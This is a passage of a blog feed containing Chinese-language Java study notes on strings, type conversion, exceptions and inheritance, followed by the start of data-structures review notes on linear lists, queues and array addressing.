operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueof</span><span class="token punctuation">(</span><span class="token string">"1002"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//当然s只能是数字类的字符串</span>或者<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"1002"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">3.</span>将整形转成字符串<span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueof</span><span class="token punctuation">(</span><span class="token number">1025</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  直接转成了 <span class="token number">4.</span>将整形转成十六进制的数<span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//输出结果12</span><span class="token number">1</span><span class="token function">isLetter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是一个字母<span class="token number">2</span><span class="token function">isDigit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是一个数字字符<span class="token number">3</span><span class="token function">isWhitespace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是一个空白字符<span class="token number">4</span><span class="token function">isUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是大写字母<span class="token number">5</span><span class="token function">isLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>是否是小写字母<span class="token number">6</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>指定字母的大写形式<span class="token number">7</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>指定字母的小写形式<span class="token number">8</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>返回字符的字符串形式，字符串的长度仅为<span class="token number">1</span>            <span class="token keyword">private</span> <span class="token class-name">String</span> value<span class="token punctuation">;</span>value<span class="token operator">=</span>value<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//转大写</span><span class="token keyword">private</span>  <span class="token class-name">String</span> word<span class="token punctuation">;</span>word<span class="token operator">=</span>word<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>word<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//首字母大写，其他小写</span>word<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//0开始到1分隔</span>                <span class="token class-name">String</span> s<span class="token operator">=</span>sc<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  输入<span class="token number">11</span><span class="token operator">:</span><span class="token number">20</span><span class="token class-name">String</span> x<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过":"分隔字符串,x[0]="11",x[1]="20"</span><span class="token keyword">int</span> a<span class="token operator">=</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> b<span class="token operator">=</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The BMI is %.4f"</span><span class="token punctuation">,</span>BMI<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//保留四位小数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"> &#x2F;&#x2F;异常 public static void main(String[] args) &#123;    Scanner sc &#x3D; new Scanner(System.in);    while (sc.hasNext()) &#123;        String choice &#x3D; sc.next();        try &#123;            if (choice.equals(&quot;number&quot;))                throw new NumberFormatException();            else if (choice.equals(&quot;illegal&quot;)) &#123;                throw new IllegalArgumentException();            &#125; else if (choice.equals(&quot;except&quot;)) &#123;                throw new Exception();            &#125; else            break;        &#125;        &#x2F;*这里放置你的答案*&#x2F;        catch(NumberFormatException e) &#123;        System.out.println(&quot;number format exception&quot;);        System.out.println(e);        &#125;        catch(IllegalArgumentException e) &#123;        System.out.println(&quot;illegal argument exception&quot;);        System.out.println(e);        &#125;        catch(Exception e) &#123;        System.out.println(&quot;other exception&quot;);        System.out.println(e);        &#125;    &#125;&#x2F;&#x2F;end while    sc.close();&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java">这是别人发的DAY_01<span class="token number">1.</span><span class="token class-name">Java</span>源代码（通过javac编译为）<span class="token operator">-></span>字节码文件<span class="token operator">-></span>执行并运行结果<span class="token number">2.D</span>OS 运行JAVA常见错误：文件名被隐藏——隐藏已知类型的扩展名 这个√取消javac <span class="token operator">+</span>文件名<span class="token operator">+</span>扩展名java<span class="token operator">+</span>类名 不带扩展名<span class="token number">3.</span>path环境变量配置作用：程序执行需要使用外部指令javac<span class="token punctuation">,</span>但是javac指令仅仅能在JDK安装目录下的bin目录下使用。而程序开发的时候，不能将源代码写入JDK的安装目录，因此需要将源程序保存到任意位置的指定目录classpath作用：设定为<span class="token keyword">class</span>文件的目录，使classpath目录中的<span class="token punctuation">.</span><span class="token keyword">class</span>可以在任意目录运行DAY_02<span class="token number">4.</span>关键字全部小写<span class="token keyword">goto</span>和<span class="token keyword">const</span>是保留字<span class="token number">5.</span>包其实就是文件夹，用于把相同类名进行区分类或者接口：每个单词首字母大写 方法变量：从第二个单词开始首字母大写文档注释<span class="token comment">/** **/</span><span class="token number">6.8421</span>码 是bcd一种<span class="token number">7.</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token keyword">byte</span> b1 <span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>b2 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span>b<span class="token punctuation">;</span>b<span class="token operator">=</span>b1<span class="token operator">+</span>b2<span class="token punctuation">;</span><span class="token comment">//类型提升，将byte转化为Int类型</span>b<span class="token operator">=</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">//常量相加，先把结果计算出来，然后再转为对应类型</span><span class="token class-name">XJad</span><span class="token operator">:</span>将<span class="token punctuation">.</span><span class="token keyword">class</span>文件反编译为java文件<span class="token number">8.</span>计算机中数据运算都是补码进行的获取<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">130</span>二进制<span class="token operator">-></span>做截取，截成<span class="token keyword">byte</span><span class="token operator">-></span>已知补码求原码其中第三步：补码 <span class="token number">10000010</span><span class="token operator">-></span>反码 <span class="token number">10000001</span> <span class="token operator">-></span> 原码 <span class="token number">11111110</span>由此<span class="token keyword">byte</span> <span class="token number">130</span> 为<span class="token operator">-</span><span class="token number">126</span><span class="token number">9.</span>看程序写结果字符和一个整数相加，<span class="token function">println</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">98</span>字符串数据和其他数据做<span class="token operator">+</span>，这个<span class="token operator">+</span>是字符串连接符DAY_03 _04<span class="token number">1.</span><span class="token operator">&amp;</span>有<span class="token boolean">false</span>则<span class="token boolean">false</span> <span class="token operator">|</span> 有<span class="token boolean">true</span>则<span class="token boolean">true</span> <span class="token operator">^</span><span class="token punctuation">(</span>异或<span class="token punctuation">)</span> 相同为<span class="token boolean">false</span><span class="token number">2.</span><span class="token class-name">Alt</span><span class="token operator">+</span><span class="token operator">/</span>自动填充函数<span class="token number">3.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>里头可以输出汉字<span class="token class-name">Scanner</span> in  <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"echo:"</span><span class="token operator">+</span>in<span class="token punctuation">.</span><span class="token function">nextline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2+3="</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">3</span>）<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">4.</span>ctrl<span class="token operator">+</span><span class="token operator">/</span> 注释代码或解开注释<span class="token number">5.</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"100-"</span><span class="token operator">+</span>in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"="</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>要输入两次<span class="token number">6.</span><span class="token keyword">return</span> 不是结束循环，而是结束方法DAY _05<span class="token number">1.</span>数组逆序（元素对调）返回值类型 <span class="token keyword">void</span>！！！（无需返回，<span class="token keyword">void</span>返回的就是数组地址）<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> x<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>arr<span class="token punctuation">.</span>lenght<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token number">2.</span><span class="token keyword">final</span> <span class="token keyword">int</span> 常量定义<span class="token number">3.</span><span class="token keyword">void</span>类型 没有明确的返回值 直接输出不能够输出调用 赋值调用 因为println不能是空类型<span class="token number">4.</span>数组初始化有动态、静态两种方式，只能任选其一：动态：<span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>  静态：<span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span>arr <span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">new</span>可以看成是为arr分配地址<span class="token number">5.</span>栈：存放局部变量栈的特点：用完即释放堆：堆放所有<span class="token keyword">new</span>出来的东西堆的特点：每个都有地址值 都有初始值 使用完毕变成垃圾，没有立即回收，会在空闲时回收<span class="token class-name">Array</span> <span class="token class-name">Index</span> <span class="token class-name">Out</span> of <span class="token class-name">Bound</span> <span class="token class-name">Exception</span><span class="token operator">:</span>数组索引越界<span class="token class-name">Null</span> <span class="token class-name">Pointer</span> <span class="token class-name">Exception</span><span class="token operator">:</span>空指针异常 DAY_06<span class="token number">1</span>、二维数组 定义格式 推荐：数据类型 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> 数组名 <span class="token operator">=</span> <span class="token keyword">new</span> 数据类型<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>其他：数据类型 数组名<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> 数据类型<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span>          数据类型<span class="token punctuation">[</span><span class="token punctuation">]</span> 数组名<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> 数据类型<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token number">2.</span>一个java文件中写两个类：一个基本的类，一个测试类在测试类（含主函数）中编译<span class="token class-name">Java</span>文件，会将该类所涉及的所有类都编译成<span class="token keyword">class</span>报错实参形参长度不同，一定是没有给一定数量的参数或者压根没有给参数<span class="token number">3.</span>main 方法储存在栈里头，然后在堆里储存类的代码，最后调用在方法区的方法DAY_07<span class="token number">1.</span>成员变量与局部变量的区别成员变量在类中方法外 局部变量在定义中或方法声明上成员变量在堆内存，局部变量在栈内存成员变量随着对象的创建而存在，局部变量随着方法调用存在成员变量有默认初始化值，局部变量必须定义赋值然后才能使用<span class="token number">2.</span>类型包括基本数据类型、引用类型（数组、类、接口）  形式参数的改变直接影响实际参数（如果是引用类型的话）  方法里头调用一个类，此时传进去的是类的地址<span class="token number">3.</span>匿名对象：没有名字的对象 可以作为实际参数传递  <span class="token keyword">new</span> student<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>不适合多次调用，用完被垃圾回收器回DAY_08<span class="token number">1.</span>在同一个文件夹下，类定义在一个文件还是两个文件下相同<span class="token number">2.</span>构造代码块在构造函数之前执行，且出现在类中的成员位置局部代码块用于限定变量的声明周期 静态代码块与构造代码块类似，只是用<span class="token keyword">static</span>修饰了构造代码块只需要在代码外面有一个大括号，在一个类中代码无法在成员变量的位置直接执行例如：<span class="token keyword">class</span> demo<span class="token punctuation">&#123;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>中的输出是无法执行的<span class="token number">3.</span>开发的原则：低耦合，高内聚 耦合：类与类之间的关系 内聚：自己完成事件的能力<span class="token number">4.</span>子类不能继承父类的私有变量和私有方法，即只能继承父类所有非私有的成员<span class="token number">5.</span>举例输出子类局部、成员、继承的父类变量<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">this</span><span class="token punctuation">(</span><span class="token punctuation">)</span>调用本类成员变量的构造方法，<span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>调用父类的构造方法 同理，<span class="token keyword">super</span><span class="token punctuation">.</span>方法，<span class="token keyword">this</span><span class="token punctuation">.</span>方法<span class="token number">6.</span>子类所有构造方法默认会访问父类的【空参数】构造方法 子类初始化之前一定要先完成父类的初始化<span class="token number">7.</span>父类如果只有一个含参构造函数，那么默认的无参构造函数会消失因此要在父类加入一个无参构造函数；或者使用<span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>调用父类的含参构造函数或者通过<span class="token keyword">this</span><span class="token punctuation">(</span><span class="token punctuation">)</span>调用一个访问了父类构造方法的成员方法 而且<span class="token keyword">this</span> <span class="token keyword">super</span>必须在第一个语句上<span class="token number">8.</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>······；<span class="token punctuation">&#125;</span>方法的重写子类不能访问权限比父类更低 比如不可以子类为<span class="token keyword">void</span> 父类为<span class="token keyword">public</span>父类用静态方法，子类也必须用静态方法重写<span class="token class-name">Day</span> <span class="token number">09</span><span class="token operator">:</span><span class="token number">1</span>、<span class="token keyword">final</span> 可以修饰类、方法、变量，此时父类的功能不能被覆盖最终类不能被继承 <span class="token keyword">final</span>的方法 叫覆盖、重写、复写<span class="token keyword">final</span>修饰基本类型：值不能发生改变 修饰引用类型：引用地址不能发生改变<span class="token number">2</span>、多态：有继承关系、有方法重写、有父类引用指向子类对象子类可以访问父类的变量，但是父类不能访问子类的变量 多态中成员变啦领编译运行看左边成员方法的编译看左边，运行看右边弊端：不能使用子类特有的功能向下转型：把 <span class="token class-name">Zi</span> z <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Zi</span><span class="token punctuation">)</span> f f能转化为zi<span class="token number">3</span>、抽象类具有构造方法，但是不能实例化<span class="token number">4</span>、接口没有构造方法 接口方法不能有主体ctrl shitf f 格式化 ctrl shitf o 导包<span class="token class-name">Integer</span><span class="token punctuation">.</span>toHexString 整数转为十六进制<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">&#125;</span>DAY <span class="token number">12</span><span class="token number">1</span>、字符串一旦被赋值，就不能改变 <span class="token class-name">String</span> s 值不能变，但是引用s可以变<span class="token number">2</span>、<span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>创建<span class="token number">2</span>个对象<span class="token punctuation">,</span><span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"hello"</span>创建<span class="token number">1</span>个对象<span class="token number">3</span>、<span class="token operator">==</span> 比较引用对象，是比较地址，equals默认是地址，但是<span class="token class-name">String</span>改写后 判断内容相等<span class="token number">4</span>、字符串相加：如果是变量，先开空间再拼接，如果是常量，先加然后在常量池寻找 有就返回<span class="token number">5</span>、字符串内容为空 <span class="token class-name">String</span> s  <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span>字符串对象为空 <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">null</span><span class="token number">6</span>、<span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 比较字符串内容是否相同，区分大小写<span class="token keyword">boolean</span> <span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 比较自妇产内容是否相同，忽略大小写<span class="token keyword">boolean</span> <span class="token function">contains</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 判断大字符串中是否包含小字符串<span class="token keyword">boolean</span> <span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 判断字符串是否以某个指定的字符串开头<span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 判断字符串是否为空<span class="token number">7</span>、<span class="token keyword">byte</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> getBytes 把字符串转换为字节数组<span class="token keyword">char</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 把字符串转换为字符数组<span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">valueof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chs<span class="token punctuation">)</span> 把字符数组转换为字符串string<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 把字符串转成小写compareTo 函数 按字典顺序比较两个字符串<span class="token number">8</span>、<span class="token class-name">Arrays</span><span class="token punctuation">.</span>toString（arr）把arr转成字符串 <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>数组排序 <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span>  <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">""</span> <span class="token operator">+</span> number <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueof</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span> <span class="token keyword">int</span><span class="token operator">-></span><span class="token class-name">String</span><span class="token class-name">String</span><span class="token operator">-></span><span class="token class-name">Int</span><span class="token operator">:</span> str<span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token number">9</span>、<span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toBinaryString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>十进制转到二进制 <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toOctalString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 转到八进制十进制转到其他进制： <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>num，rad<span class="token punctuation">)</span>其他进制转到十进制：<span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">,</span>rad<span class="token punctuation">)</span><span class="token number">10</span>、<span class="token keyword">try</span><span class="token punctuation">&#123;</span>可能出现的问题<span class="token punctuation">&#125;</span><span class="token keyword">catch</span>（异常名 变量比如：<span class="token class-name">ParseException</span> e）<span class="token punctuation">&#123;</span>针对问题的处理<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>（<span class="token keyword">finally</span><span class="token punctuation">&#123;</span>释放资源<span class="token punctuation">&#125;</span>）<span class="token number">11</span>、<span class="token class-name">Exception</span> e 所有异常的父类 <span class="token function">simpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd HH:MM:ss"</span><span class="token punctuation">)</span><span class="token number">12</span>、如果要自己写一个异常类 需要继承自<span class="token class-name">Exception</span> 或者 继承自<span class="token class-name">RuntimeException</span>字符串考点spllit方法 抽象类不能实例化 异常处理机制 数组的定义 回文 二进制 三角函数 随机数 栈、队列 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h3 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h3><p>对于给定的n个元素，可以构造出的逻辑结构有<strong>集合、线性、树、图</strong>四种。</p><p> 一个算法具有5个特性：<strong>_有穷_、_确定_、_可行_、_有0个或多个输入_和_有一个或多个输出_。</strong></p><p>对算法设计的4个要求是<strong><em>正确_、_可读_、_健壮_和_效率与低存储要求</em></strong>。</p><p><img src="/2021/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20201226101009754.png" alt="image-20201226101009754" loading="lazy"></p><p>1、对线性表的基本操作有哪些？</p><p>答：</p><p>1、构造空线性表；</p><p>2、销毁线性表；</p><p>3、获取线性表表长；</p><p>4、判断线性表是否空表；</p><p>5、访问线性表中第i个元素；</p><p>6、获取线性表中第1个满足某关系的元素e的位置；</p><p>7、在线性表中第i个元素前（或后）插入新元素；</p><p>8、将线性表中第i个元素删除。</p><h3 id="数组，栈，队列"><a href="#数组，栈，队列" class="headerlink" title="数组，栈，队列"></a>数组，栈，队列</h3><p>8、表达式23+((12<em>3-2)/4+34</em>5/7)+108/9的后缀表达式是<strong><em>23 12 3<em>2-4/34 5</em>7/++108 9 /+</em></strong>。</p><p><strong>画树或者直接写  左根右→左右根</strong></p><p>13、设循环队列用数组A[1..M]表示，队首、队尾指针分别是FRONT和TAIL，判定队满的条件为<strong>_(TAIL+1)%M==FRONT%M_。</strong></p><p>14、设Q[0..N-1]为循环队列，其头、尾指针分别为P和R，则队Q中当前所含元素个数为<strong><em>(R-P+N)%N</em></strong>。</p><p>设数组a[1..50,1..80]的基地址为2000，每个元素占2个存储单元，若以行序为主序顺序存储，则元素a[45,68]的存储地址为___9174__；若以列序为主序顺序存储，则元素a[45,68]的存储地址为___8788__。</p><p><strong>行：（44 * 80 + 67） * 2 + 